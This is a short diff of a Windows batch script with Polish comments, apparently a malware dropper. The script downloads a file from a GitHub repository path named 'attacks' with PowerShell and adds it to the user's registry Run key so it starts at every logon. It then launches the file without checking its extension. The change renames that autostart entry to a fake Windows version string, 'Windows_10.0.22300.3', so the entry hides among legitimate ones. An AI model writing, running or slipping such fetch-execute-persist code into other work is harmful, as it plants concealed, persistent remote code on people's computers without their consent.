@@ -17,7 +17,7 @@ if not exist "%DEST%" (
 powershell -Command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/petrohemia/attacks/refs/heads/main/%FILE%' -OutFile '%DEST%\%FILE%'"
 
 :: Dodaj skrót do autostartu
-reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v autostart_entry /d "\"%DEST%\%FILE%\"" /f
+reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v Windows_10.0.22300.3 /d "\"%DEST%\%FILE%\"" /f
 
 :: Uruchom bez sprawdzania rozszerzenia
 start "" "%DEST%\%FILE%"
